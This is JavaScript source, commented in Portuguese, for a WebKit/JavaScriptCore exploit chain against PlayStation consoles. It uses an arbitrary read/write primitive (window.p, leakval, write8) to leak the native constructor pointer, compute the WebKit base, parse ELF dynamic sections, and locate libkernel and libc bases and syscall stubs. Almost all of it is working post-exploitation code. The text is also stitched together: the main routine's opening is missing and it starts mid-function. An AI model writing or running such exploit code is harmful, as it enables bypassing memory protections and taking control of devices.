// ═════════════════════════════════════════════════════════════════════════════
// NID → nome legível (PS4 usa NID no strtab, não o nome C)
// ═════════════════════════════════════════════════════════════════════════════
const NID_MAP = {
  // libc
  '8zTFvBIAIN8': 'memset',
  'Q3VBxCXhUHs': 'memcpy',
  'gQX+4GDQjpM': 'malloc',
  'tIhsqj0qsFE': 'free',
  'Ovb2dSJOAuE': 'strcmp',
  'DfivPArhucg': 'memcmp',
  'Q2V+iqvjgC0': 'vsnprintf',
  'gNQ1V2vfXDE': 'setjmp',
  'lKEN2IebgJ0': 'longjmp',
  // libkernel / posix
  'f7uOxY9mM1U': '__stack_chk_guard',
  '6UgtwV+0zb4': 'scePthreadCreate',
  'onNY9Byn-W8': 'scePthreadJoin',
  'nsYoNRywwNg': 'scePthreadAttrInit',
  'UTXzJbWhhTE': 'scePthreadAttrSetstacksize',
  '-Wreprtu0Qs': 'scePthreadAttrSetdetachstate',
  '62KCwEMmzcM': 'scePthreadAttrDestroy',
  'zl7hupSO0C0': 'sceKernelSendNotificationRequest',
  'MhC53TKmjVA': 'sysctlbyname',
  'OxhIB8LB-PQ': 'pthread_create',
  'HoLVWNanBBc': 'getpid',
  'g0VTBxfJyu0': 'sceKernelGetCurrentCpu',
  'LwG8g3niqwA': 'sceKernelDlsym',
  'Jmi+9w9u0E4': 'pthread_create_name_np',
  'h9CcP3J0oVM': 'pthread_join',
  'FJrT5LuUBAU': 'pthread_exit',
};

function resolveName(raw) {
  if (!raw) return raw;
  // NID puro ou NID#X#Y
  const base = raw.split('#')[0];
  return NID_MAP[base] || NID_MAP[raw] || raw;
}

// ═════════════════════════════════════════════════════════════════════════════
// get_jmptgt — resolve stub PLT (ff 25 / e9) para o endereço real
// ═════════════════════════════════════════════════════════════════════════════
function get_jmptgt(p, addr) {
  try {
    // Padrão comum: FF 25 xx xx xx xx  (jmp qword ptr [rip+disp32])
    const b0 = p.read1(addr);
    const b1 = p.read1(addr.add32(1));
    if (b0 === 0xFF && b1 === 0x25) {
      const disp = p.read4(addr.add32(2));
      // disp é signed
      const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
      const slot = addr.add32(6 + signed);
      return p.read8(slot);
    }
    // JMP rel32: E9 xx xx xx xx
    if (b0 === 0xE9) {
      const disp = p.read4(addr.add32(1));
      const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
      return addr.add32(5 + signed);
    }
    // Já é ponteiro resolvido / não é stub
    return addr;
  } catch (e) {
    return addr;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// findElfBase — anda para trás procurando magic ELF, com passo de página
// ═════════════════════════════════════════════════════════════════════════════
function findElfBase(p, startPtr, maxBack) {
  if (!startPtr) return null;
  let curLow = 0;
  try {
    // Normaliza para número low quando possível
    if (typeof startPtr === 'object' && startPtr.low !== undefined) {
      curLow = (startPtr.low >>> 0) & ~0xFFF;
    } else {
      curLow = (Number(startPtr) >>> 0) & ~0xFFF;
    }
  } catch (e) {
    return null;
  }

  const pages = Math.min(Math.floor((maxBack || 0x200000) / 0x1000), 0x400);
  for (let i = 0; i < pages; i++) {
    try {
      const test = startPtr.sub32((startPtr.low & 0xFFF) + i * 0x1000);
      const m = p.read4(test);
      if (m === 0x464C457F) return test;
    } catch (e) {
      // página não mapeada — continua
    }
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO DINÂMICA DE BASES (corrigida)
// ═════════════════════════════════════════════════════════════════════════════
async function resolveAllBases(p, parseBase, loadBase) {
  // parseBase = onde está o header ELF (ou loadBase se não houver)
  // loadBase  = VA 0 do 1º LOAD (base real do módulo para offsets)
  if (!loadBase) loadBase = parseBase;
  logH('PARSING ELF DO WEBKIT');
  const imports = {};
  let libkernelBase = null;
  let libcBase = null;

  try {
    // ─── Passo 1: magic (opcional no PS4) ───
    log('[*] Lendo magic em parseBase 0x' + parseBase.toString(16) + '...');
    let magic = 0;
    let hasElf = false;
    try {
      magic = p.read4(parseBase) >>> 0;
    } catch (e) {
      log('[-] Falha ao ler magic: ' + e.message, 'e');
    }
    if (magic === 0x464C457F) {
      hasElf = true;
      log('[+] ELF magic válido (\\x7fELF)');
    } else {
      log('[!] Sem ELF magic (0x' + magic.toString(16) + ') — parsing limitado', 'w');
    }

    // ─── Passo 2/3: program headers + PT_DYNAMIC (só se tiver ELF) ───
    let dynamicVaddr = null;
    let dynamicSize = 0;

    if (hasElf) {
      let phoffVal = 0, phnum = 0, phentsize = 0x38;
      try {
        const phoffObj = p.read8(parseBase.add32(0x20));
        phoffVal = (typeof phoffObj === 'object' && phoffObj.low !== undefined)
          ? (phoffObj.low >>> 0) : (Number(phoffObj) >>> 0);
        phnum = p.read2(parseBase.add32(0x38)) & 0xffff;
        phentsize = p.read2(parseBase.add32(0x36)) & 0xffff || 0x38;
        log('[+] phoff=0x' + phoffVal.toString(16) + ' phnum=' + phnum + ' phentsize=' + phentsize);
      } catch (e) {
        log('[-] Falha ao ler program headers: ' + e.message, 'e');
      }

      if (phnum > 64) {
        log('[!] phnum suspeito (' + phnum + '), limitando a 32', 'w');
        phnum = 32;
      }

      for (let i = 0; i < phnum; i++) {
        try {
          const phAddr = parseBase.add32(phoffVal + i * phentsize);
          const p_type = p.read4(phAddr) >>> 0;
          if (p_type === 2 /* PT_DYNAMIC */) {
            // p_vaddr é relativo ao load base (VA 0)
            const dynOff = p.read8(phAddr.add32(0x10));
            const memsz = p.read8(phAddr.add32(0x28));
            dynamicSize = (typeof memsz === 'object' && memsz.low !== undefined)
              ? (memsz.low >>> 0) : (Number(memsz) >>> 0);
            // Endereço real = loadBase + p_vaddr
            const offLow = (typeof dynOff === 'object' && dynOff.low !== undefined)
              ? (dynOff.low >>> 0) : (Number(dynOff) >>> 0);
            dynamicVaddr = loadBase.add32(offLow);
            log('[+] PT_DYNAMIC load+0x' + offLow.toString(16) +
                ' → 0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
            break;
          }
        } catch (e) {
          log('[!] Erro no PHDR[' + i + ']: ' + e.message, 'w');
        }
      }
    }

    if (!dynamicVaddr) {
      log('[-] PT_DYNAMIC não encontrado — sem imports via ELF', 'w');
      return { imports, libkernelBase, libcBase };
    }

    // ─── Passo 4: parse tags ───
    let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
    const seenTags = [];
    const maxEntries = Math.min(Math.floor((dynamicSize || 0x800) / 16), 256);

    log('[*] Parseando até ' + maxEntries + ' entradas dynamic...');
    for (let i = 0; i < maxEntries; i++) {
      try {
        const entry = dynamicVaddr.add32(i * 16);
        const tagObj = p.read8(entry);
        const tag = (typeof tagObj === 'object' && tagObj.low !== undefined) ? (tagObj.low >>> 0) : (Number(tagObj) >>> 0);
        if (tag === 0) break;
        const val = p.read8(entry.add32(8));
        seenTags.push('0x' + tag.toString(16));

        if (tag === 5)  strtab = val;
        if (tag === 6)  symtab = val;
        if (tag === 23) jmprel = val;
        if (tag === 2)  pltrelsz = (typeof val === 'object' && val.low !== undefined) ? (val.low >>> 0) : (Number(val) >>> 0);
        if (tag === 7)  { /* DT_RELA */ }
        if (tag === 8)  { /* DT_RELASZ */ }
      } catch (e) {
        log('[!] Erro na entrada dynamic[' + i + ']: ' + e.message, 'w');
        break;
      }
    }
    log('[+] Tags: ' + seenTags.slice(0, 24).join(', ') + (seenTags.length > 24 ? ' ...' : ''));
    log('[+] strtab=' + (strtab ? '0x' + strtab.toString(16) : 'null') +
        ' symtab=' + (symtab ? '0x' + symtab.toString(16) : 'null') +
        ' jmprel=' + (jmprel ? '0x' + jmprel.toString(16) : 'null') +
        ' pltrelsz=0x' + (pltrelsz >>> 0).toString(16));

    // ─── Passo 5: imports via JMPREL ───
    function addImport(rawName, r_offset) {
      try {
        const importPtr = p.read8(r_offset);
        const realPtr = get_jmptgt(p, importPtr);
        const name = resolveName(rawName);
        const wkOffset = r_offset.sub(loadBase);
        imports[name] = { rawName, wkOffset, importPtr, realPtr };
      } catch (e) {}
    }

    if (jmprel && symtab && strtab && pltrelsz > 0) {
      let numRela = Math.floor(pltrelsz / 24);
      if (numRela > 2000) {
        log('[!] pltrelsz muito grande (' + numRela + '), limitando a 800', 'w');
        numRela = 800;
      }
      log('[+] Varrendo ' + numRela + ' entradas JMPREL...');
      let added = 0;
      for (let i = 0; i < numRela; i++) {
        try {
          const relaEnt = jmprel.add32(i * 24);
          const r_offset = p.read8(relaEnt);
          const symIndex = p.read4(relaEnt.add32(12)) >>> 0; // high 32 de r_info
          const st_name = p.read4(symtab.add32(symIndex * 24)) >>> 0;
          let raw = '';
          for (let j = 0; j < 48; j++) {
            const ch = p.read1(strtab.add32(st_name + j));
            if (ch === 0) break;
            if (ch < 32 || ch > 126) { raw = ''; break; }
            raw += String.fromCharCode(ch);
          }
          if (raw.length >= 4) {
            addImport(raw, r_offset);
            added++;
          }
        } catch (e) {
          if (i < 3) log('[!] JMPREL[' + i + '] erro: ' + e.message, 'w');
        }
        // Yield periódico para não travar o event loop
        if ((i & 0x7F) === 0x7F) {
          await new Promise(r => setTimeout(r, 0));
        }
      }
      log('[+] Entradas processadas com nome válido: ' + added);
    } else {
      log('[-] JMPREL/SYMTAB/STRTAB incompletos — sem imports via DYNAMIC', 'w');
    }

    log('[+] Total de imports no mapa: ' + Object.keys(imports).length);

    const useful = [
      'memset', 'memcpy', 'malloc', 'free', 'strcmp',
      '__stack_chk_guard', 'sceKernelSendNotificationRequest',
      'sceKernelDlsym', 'getpid', 'scePthreadCreate', 'pthread_create'
    ];
    for (const name of useful) {
      if (imports[name]) {
        const e = imports[name];
        log('    ' + name +
            '  wkOff=0x' + e.wkOffset.toString(16) +
            '  stub=0x' + e.importPtr.toString(16) +
            '  real=0x' + e.realPtr.toString(16), 'd');
      }
    }

    // ─── Passo 6: bases ───
    log('[*] Procurando base libkernel...');
    const lkCandidates = [
      imports['__stack_chk_guard'],
      imports['getpid'],
      imports['sceKernelDlsym'],
      imports['sceKernelSendNotificationRequest'],
      imports['scePthreadCreate'],
      imports['pthread_create']
    ].filter(Boolean);

    for (const ref of lkCandidates) {
      log('[*] findElfBase a partir de 0x' + ref.realPtr.toString(16) + ' ...');
      const base = findElfBase(p, ref.realPtr, 0x300000);
      if (base) {
        libkernelBase = base;
        log('[+] libkernel base: 0x' + libkernelBase.toString(16), 'ok');
        setCard('c-lk', '0x' + libkernelBase.toString(16));
        break;
      }
    }
    if (!libkernelBase) log('[-] Base libkernel não encontrada', 'w');

    log('[*] Procurando base libc...');
    const lcCandidates = [
      imports['memset'], imports['memcpy'], imports['malloc'], imports['free']
    ].filter(Boolean);

    for (const ref of lcCandidates) {
      log('[*] findElfBase a partir de 0x' + ref.realPtr.toString(16) + ' ...');
      const base = findElfBase(p, ref.realPtr, 0x300000);
      if (base && base.toString(16) !== loadBase.toString(16)) {
        libcBase = base;
        log('[+] libc base: 0x' + libcBase.toString(16), 'ok');
        setCard('c-lc', '0x' + libcBase.toString(16));
        break;
      }
    }
    if (!libcBase) log('[-] Base libc não encontrada', 'w');

  } catch (e) {
    log('[-] Exceção em resolveAllBases: ' + (e && e.message ? e.message : e), 'e');
    if (e && e.stack) log(String(e.stack).slice(0, 300), 'd');
  }

  return { imports, libkernelBase, libcBase };
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════
async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  const valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    const magic = p.read4(libkernelBase);
    if (magic === 0x464C457F) {
      log('[✓] libkernel: ELF magic válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  if (libcBase) {
    const magic = p.read4(libcBase);
    if (magic === 0x464C457F) {
      log('[✓] libc: ELF magic válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  // Stubs de syscall (mov rax, imm32; mov r10, rcx)
  if (libkernelBase && valid.libkernel) {
    let foundStubs = 0;
    for (let off = 0; off < 0x80000; off += 0x10) {
      try {
        const b0 = p.read1(libkernelBase.add32(off));
        const b1 = p.read1(libkernelBase.add32(off + 1));
        const b2 = p.read1(libkernelBase.add32(off + 2));
        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
          const b7 = p.read1(libkernelBase.add32(off + 7));
          const b8 = p.read1(libkernelBase.add32(off + 8));
          const b9 = p.read1(libkernelBase.add32(off + 9));
          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
            foundStubs++;
            if (foundStubs >= 3) break;
          }
        }
      } catch (e) {}
    }
    if (foundStubs >= 2) {
      log('[✓] libkernel: ' + foundStubs + ' stubs de syscall encontrados', 'ok');
    } else {
      log('[!] libkernel: poucos stubs de syscall (' + foundStubs + ') — base pode estar errada', 'w');
    }
  }

  // Alinhamento de página
  if (libkernelBase) {
    const aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel alinhada a página' : '[✗] libkernel NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }
  if (libcBase) {
    const aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc alinhada a página' : '[✗] libc NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// PREPARAÇÃO DO BUFFER DE NOTIFICAÇÃO
// ═════════════════════════════════════════════════════════════════════════════
function prepareNotification(p, libkernelBase, imports, text) {
  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');

  const notifyImport = imports['sceKernelSendNotificationRequest'];
  if (!notifyImport) {
    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
    log('[*] Dica: verifique se o NID zl7hupSO0C0 apareceu no parse', 'w');
    return null;
  }

  // Usa o ponteiro REAL (já resolvido pelo get_jmptgt)
  const notifyFunc = notifyImport.realPtr || notifyImport.importPtr;
  log('[+] Endereço real da API: 0x' + notifyFunc.toString(16));
  log('[+] wkOffset do import: 0x' + notifyImport.wkOffset.toString(16));

  const encoder = new TextEncoder();
  const msgBytes = encoder.encode(text + '\x00');

  const buf = new Uint8Array(0x400);
  // SceNotificationRequest layout simplificado
  // type / useIcon / etc. — campos básicos
  buf[0] = 0; // type (mensagem)
  buf[4] = 0; // userId
  buf.set(msgBytes, 0x10); // mensagem em offset típico (ajuste se necessário)

  const arrCell = p.leakval(buf);
  const backingStore = p.read8(arrCell.add32(0x10));

  // Ajustes comuns em exploits (backing store / length)
  try {
    p.write8(backingStore.add32(0x8), backingStore.add32(0x10));
    p.write4(backingStore.add32(0x10), msgBytes.length);
  } catch (e) {}

  log('[+] Buffer alocado em: 0x' + backingStore.toString(16), 'ok');

  return {
    notifyFunc,
    requestBuffer: backingStore,
    wkOffset: notifyImport.wkOffset
  };
}

  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases com estabilidade...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    let webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] Candidato WebKit Base (ctor-0x' + hc.toString(16) + '): 0x' + webkitBase.toString(16), 'a');
    setCard('c-wk', '0x' + webkitBase.toString(16) + '?');
    log('[*] Entrando na fase segura (sem setTimeout)...', 'i');
    setStatus('Fase segura...', 'r');

    (async () => {
      log('[*] async iniciado', 'i');
      // ─── FASE SEGURA: não ler regiões de código ainda ───
      // Leituras em loadBase/código do WebKit estavam causando crash nativo
      // (page fault que try/catch JS não captura).
      logH('FASE SEGURA — SEM LEITURA DE CÓDIGO');
      log('[+] WebKit loadBase (calculada): 0x' + webkitBase.toString(16), 'ok');
      setCard('c-wk', '0x' + webkitBase.toString(16));
      setStatus('Testando R/W no heap...', 'r');

      // 1) Confirmar que R/W funciona no HEAP (objeto JS)
      let heapOk = false;
      try {
        const probe = { x: 0x41414141 };
        const cell = p.leakval(probe);
        log('[*] leakval(probe) = 0x' + cell.toString(16));
        // butterfly / backing costuma ficar em cell+0x10 (varia, só teste)
        const dw = p.read4(cell) >>> 0;
        log('[*] dword em cell: 0x' + dw.toString(16));
        heapOk = true;
        log('[+] R/W no heap OK', 'ok');
      } catch (e) {
        log('[-] R/W heap falhou: ' + (e && e.message ? e.message : e), 'e');
      }

      // 2) Teste ÚNICO e cuidadoso: ler 4 bytes no próprio endereço do ctor
      //    (sabemos que está mapeado porque o ponteiro veio de lá)
      let codeReadOk = false;
      try {
        log('[*] Tentando ler 4 bytes no ctor 0x' + ctorInt64.toString(16) + ' ...');
        const atCtor = p.read4(ctorInt64) >>> 0;
        log('[+] Leitura no ctor OK: 0x' + atCtor.toString(16), 'ok');
        codeReadOk = true;
      } catch (e) {
        log('[-] Leitura no ctor FALHOU: ' + (e && e.message ? e.message : e), 'e');
        log('[!] R/W provavelmente só funciona no heap, não em código/RX', 'w');
      }

      // 3) Se leitura de código funcionou, tentar loadBase (1 dword só)
      if (codeReadOk) {
        try {
          log('[*] Tentando 1 dword em loadBase 0x' + webkitBase.toString(16) + ' ...');
          const atBase = p.read4(webkitBase) >>> 0;
          log('[+] loadBase dword: 0x' + atBase.toString(16), 'ok');
        } catch (e) {
          log('[-] Leitura loadBase falhou: ' + (e && e.message ? e.message : e), 'e');
        }
      }

      // Resumo — NÃO chama resolveAllBases / validateBases ainda
      const cbox = document.getElementById('cbox');
      cbox.style.display = 'block';
      document.getElementById('c-out').textContent =
          'WebKit loadBase = 0x' + webkitBase.toString(16) + '\n' +
          'ctor            = 0x' + ctorInt64.toString(16) + '\n' +
          'offset usado    = 0x' + hc.toString(16) + '\n' +
          'heap R/W        = ' + (heapOk ? 'OK' : 'FAIL') + '\n' +
          'code R/W (ctor) = ' + (codeReadOk ? 'OK' : 'FAIL') + '\n' +
          '\nPróximo passo depende do code R/W.\n' +
          'Se FAIL: precisamos de outra via (vtable/heap leak).\n' +
          'Se OK: podemos parsear DYNAMIC com segurança.';

      if (codeReadOk) {
        setStatus('R/W código OK — pronto para parsing', 'ok');
        setCard('c-g', 'code R/W OK');
        log('[✓] R/W alcança código. Próximo: parsing com cuidado.', 'ok');
      } else {
        setStatus('R/W só no heap — parsing de código bloqueado', 'w');
        setCard('c-g', 'só heap');
        log('[!] Não vamos parsear ELF/código para evitar crash.', 'w');
      }

    })().catch(function(e){
      log("[-] fase segura throw: " + (e && e.message ? e.message : e), "e");
      setStatus("Erro na fase segura", "e");
    });

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
